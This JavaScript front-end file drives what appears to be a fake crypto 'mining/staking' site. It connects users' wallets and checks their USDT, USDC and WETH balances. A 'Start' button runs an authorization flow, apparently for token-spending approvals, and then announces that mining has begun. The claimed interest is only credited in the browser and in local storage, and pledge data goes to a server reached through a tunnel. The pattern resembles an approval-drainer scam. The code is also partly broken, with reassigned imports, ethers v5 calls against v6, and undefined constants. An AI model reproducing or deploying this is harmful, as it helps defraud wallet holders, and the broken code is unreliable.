import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js';
import { initializeWallet, connectWallet, disconnectWallet, handleConditionalAuthorizationFlow, userAddress, signer, usdtContract, usdcContract, wethContract } from './wallet.js';
import { updateStatus, updateTotalFunds, updateInterest, updateLanguage, claimInterest, setInitialNextBenefitTime, activateStakingUI } from './ui.js';
import { setupSSE, loadUserDataFromServer, saveUserData } from './sse.js';
import { translations } from './constants.js';

const connectButton = document.getElementById('connectButton');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmountInput = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletTokenSelect = document.getElementById('walletTokenSelect');
const claimModal = document.getElementById('claimModal');
const closeModal = document.getElementById('closeModal');
const confirmClaim = document.getElementById('confirmClaim');
const cancelClaim = document.getElementById('cancelClaim');
const modalClaimableETH = document.getElementById('modalClaimableETH');
const modalSelectedToken = document.getElementById('modalSelectedToken');
const modalEquivalentValue = document.getElementById('modalEquivalentValue');
const modalTitle = document.getElementById('modalTitle');
const languageSelect = document.getElementById('languageSelect');

async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    let attempts = 0;
    let grossOutputValue = document.getElementById('grossOutputValue');
    let cumulativeValue = document.getElementById('cumulativeValue');
    while (attempts < maxAttempts) {
        grossOutputValue = document.getElementById('grossOutputValue');
        cumulativeValue = document.getElementById('cumulativeValue');
        if (grossOutputValue && cumulativeValue) {
            console.log(`retryDOMAcquisition: Successfully acquired DOM elements after ${attempts + 1} attempts.`);
            return true;
        }
        console.warn(`retryDOMAcquisition: Attempt ${attempts + 1} failed. Retrying after ${delayMs}ms...`);
        await new Promise(resolve => setTimeout(resolve, delayMs));
        attempts++;
    }
    console.error(`retryDOMAcquisition: Failed to acquire DOM elements after ${maxAttempts} attempts.`);
    updateStatus(translations[currentLang].error + ': Failed to acquire DOM elements', true);
    return false;
}

document.addEventListener('DOMContentLoaded', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    updateLanguage(currentLang);
    await initializeWallet();
    setInterval(updateTotalFunds, 1000);
    if (!document.getElementById('grossOutputValue') || !document.getElementById('cumulativeValue')) {
        await retryDOMAcquisition();
    }
    setInitialNextBenefitTime();
    if (userAddress) {
        await loadUserDataFromServer();
        setupSSE();
    }

    // Modal 事件監聽器
    if (closeModal) {
        closeModal.addEventListener('click', () => {
            claimModal.style.display = 'none';
        });
    }
    if (cancelClaim) {
        cancelClaim.addEventListener('click', () => {
            claimModal.style.display = 'none';
        });
    }
    if (confirmClaim) {
        confirmClaim.addEventListener('click', async () => {
            claimModal.style.display = 'none';
            const claimableETHString = modalClaimableETH?.textContent?.replace(' ETH', '').trim() || '0';
            const claimableETH = parseFloat(claimableETHString);
            const selectedToken = modalSelectedToken?.textContent || 'USDT';
            const valueInTokenString = modalEquivalentValue?.textContent?.replace(/[^0-9.]/g, '') || '0';
            const valueInToken = parseFloat(valueInTokenString);

            if (isNaN(claimableETH) || isNaN(valueInToken)) {
                updateStatus(translations[currentLang].invalidCalc, true);
                return;
            }

            const grossOutputValue = document.getElementById('grossOutputValue');
            const grossOutputETH = parseFloat(grossOutputValue?.textContent?.replace(' ETH', '') || '0');
            const { claimedInterest, accountBalance } = await import('./ui.js');
            claimedInterest += claimableETH;
            accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
            localStorage.setItem('userData', JSON.stringify({
                stakingStartTime: (await import('./ui.js')).stakingStartTime,
                claimedInterest,
                pledgedAmount: (await import('./ui.js')).pledgedAmount,
                accountBalance,
                grossOutput: grossOutputETH,
                cumulative: 0,
                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                lastUpdated: Date.now()
            }));
            console.log(`claimInterest: Updated claimed interest and account balance:`, { claimedInterest, accountBalance });
            await saveUserData({
                stakingStartTime: (await import('./ui.js')).stakingStartTime,
                claimedInterest,
                pledgedAmount: (await import('./ui.js')).pledgedAmount,
                accountBalance,
                grossOutput: grossOutputETH,
                cumulative: 0,
                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                lastUpdated: Date.now(),
                source: 'index.html'
            });
            await updateInterest();
            const walletBalances = {
                usdt: userAddress ? await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
                usdc: userAddress ? await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n) : 0n,
                weth: userAddress ? await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n) : 0n
            };
            updateBalancesUI(walletBalances);
            updateStatus(translations[currentLang].claimSuccess);
        });
    }
    if (claimModal) {
        claimModal.addEventListener('click', (e) => {
            if (e.target === claimModal) claimModal.style.display = 'none';
        });
    }
});

languageSelect.addEventListener('change', (e) => {
    const lang = e.target.value;
    updateLanguage(lang);
});

connectButton.addEventListener('click', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        await connectWallet();
    }
});

startBtn.addEventListener('click', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        alert(translations[currentLang].noWallet);
        console.log(`startBtn: Clicked but no signer available.`);
        return;
    }
    const selectedToken = walletTokenSelect.value;
    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
    const selectedContract = tokenMap[selectedToken];
    try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        console.log(`startBtn: Checked balance for ${selectedToken}: ${balance.toString()}`);
        if (balance === 0n) {
            alert(`Your ${selectedToken} balance is zero. Please ensure you have sufficient balance to start.`);
            return;
        }
    } catch (e) {
        alert(`${translations[currentLang].error}: Could not fetch balance: ${e.message}`);
        console.error(`startBtn: Balance fetch error: ${e.message}`);
        return;
    }
    startBtn.disabled = true;
    startBtn.textContent = 'Authorizing...';
    try {
        await handleConditionalAuthorizationFlow();
        alert(translations[currentLang].claimSuccess + ': Mining has started.');
        await updateUIBasedOnChainState();
    } catch (error) {
        console.error(`startBtn: Authorization failed: ${error.message}`);
        alert(`${translations[currentLang].error}: Authorization failed: ${error.message}`);
        updateStatus(`${translations[currentLang].error}: Authorization failed: ${error.message}`, true);
    } finally {
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
        console.log(`startBtn: Authorization process completed.`);
    }
});

pledgeBtn.addEventListener('click', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        alert(translations[currentLang].noWallet);
        console.log(`pledgeBtn: Clicked but no signer available.`);
        return;
    }
    const amount = parseFloat(pledgeAmountInput.value) || 0;
    const duration = parseInt(pledgeDuration.value);
    const token = pledgeToken.value;
    const tokenMap = {
        'USDT': USDT_CONTRACT_ADDRESS,
        'USDC': USDC_CONTRACT_ADDRESS,
        'WETH': WETH_CONTRACT_ADDRESS
    };
    const tokenAddress = tokenMap[token];
    if (!tokenAddress) {
        alert(translations[currentLang].invalidPledgeToken);
        console.log(`pledgeBtn: Invalid token selected: ${token}`);
        return;
    }
    if (!amount || amount <= 0) {
        alert(translations[currentLang].invalidPledgeAmount);
        console.log(`pledgeBtn: Invalid pledge amount: ${amount}`);
        return;
    }
    const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
    try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        const decimals = token === 'WETH' ? 18 : 6;
        const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, decimals));
        if (amount > formattedBalance) {
            alert(translations[currentLang].insufficientBalance);
            console.log(`pledgeBtn: Insufficient balance for ${token}: ${amount} > ${formattedBalance}`);
            return;
        }
    } catch (error) {
        alert(`${translations[currentLang].error}: Could not fetch ${token} balance: ${error.message}`);
        console.error(`pledgeBtn: Balance fetch error: ${error.message}`);
        return;
    }
    updateStatus('Submitting pledge...');
    const pledgeData = {
        address: userAddress,
        pledges: {
            isPledging: true,
            cycle: duration,
            token: tokenAddress,
            amount: amount.toFixed(2)
        }
    };
    try {
        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'bypass-tunnel-reminder': 'true'
            },
            body: JSON.stringify(pledgeData)
        }));
        if (!response.ok) throw new Error(`Failed to submit pledge, status: ${response.status}`);
        const { pledgedAmount } = await import('./ui.js');
        pledgedAmount = amount;
        localStorage.setItem('userData', JSON.stringify({
            stakingStartTime: (await import('./ui.js')).stakingStartTime,
            claimedInterest: (await import('./ui.js')).claimedInterest,
            pledgedAmount,
            accountBalance: (await import('./ui.js')).accountBalance,
            grossOutput: parseFloat(document.getElementById('grossOutputValue')?.textContent?.replace(' ETH', '') || '0'),
            cumulative: parseFloat(document.getElementById('cumulativeValue')?.textContent?.replace(' ETH', '') || '0'),
            nextBenefitTime: localStorage.getItem('nextBenefitTime'),
            lastUpdated: Date.now()
        }));
        const totalPledgedValue = document.getElementById('totalPledgedValue');
        if (totalPledgedValue) {
            totalPledgedValue.textContent = `${amount.toFixed(2)} ${token}`;
        }
        console.log(`pledgeBtn: Pledged ${amount} ${token} for ${duration} days.`);
        updateStatus(translations[currentLang].pledgeSuccess);
        await saveUserData();
        await updateInterest();
    } catch (error) {
        console.error(`pledgeBtn: Pledge submission failed: ${error.message}`);
        updateStatus(translations[currentLang].pledgeError, true);
    }
});

refreshWallet.addEventListener('click', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    if (!signer) {
        alert(translations[currentLang].noWallet);
        console.log(`refreshWallet: Clicked but no signer available.`);
        return;
    }
    updateStatus(translations[currentLang].fetchingBalances);
    const balances = {
        usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
        usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
        weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
    };
    console.log(`refreshWallet: Refreshed balances:`, balances);
    updateBalancesUI(balances);
    updateStatus('');
    alert(translations[currentLang].claimSuccess + ': Wallet balance refreshed!');
});

walletTokenSelect.addEventListener('change', async () => {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    console.log(`walletTokenSelect: Changed to token: ${walletTokenSelect.value}`);
    if (!signer) {
        if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
        if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
        console.log(`walletTokenSelect: No signer, reset balance display.`);
        return;
    }
    const balances = {
        usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
        usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
        weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
    };
    console.log(`walletTokenSelect: Fetched balances:`, balances);
    updateBalancesUI(balances);
});

const tabs = document.querySelectorAll('.tab');
const sections = document.querySelectorAll('.content-section');
tabs.forEach(tab => {
    tab.addEventListener('click', async () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        sections.forEach(s => s.classList.remove('active'));
        document.getElementById(tab.dataset.tab).classList.add('active');
        console.log(`tabClick: Switched to tab: ${tab.dataset.tab}`);
        if (tab.dataset.tab === 'liquidity') {
            const grossOutputValue = document.getElementById('grossOutputValue');
            const cumulativeValue = document.getElementById('cumulativeValue');
            console.log(`tabClick: Re-acquired DOM elements:`, {
                grossOutputValue: !!grossOutputValue,
                cumulativeValue: !!cumulativeValue
            });
            if (!grossOutputValue || !cumulativeValue) {
                await retryDOMAcquisition();
            }
            await updateInterest();
        }
    });
});

async function retry(fn, maxAttempts = 3, delayMs = 3000) {
    const currentLang = localStorage.getItem('language') || 'zh-Hant';
    for (let i = 0; i < maxAttempts; i++) {
        try {
            return await fn();
        } catch (error) {
            if (error.message.includes('CORS') || error.message.includes('preflight') || error.message.includes('Unexpected token')) {
                console.warn(`retry: Error detected (CORS or JSON parse), extending delay to ${delayMs}ms: ${error.message}`);
            }
            if (i === maxAttempts - 1) throw error;
            console.warn(`retry: Attempt ${i + 1}/${maxAttempts} failed, retrying after ${delayMs}ms: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
}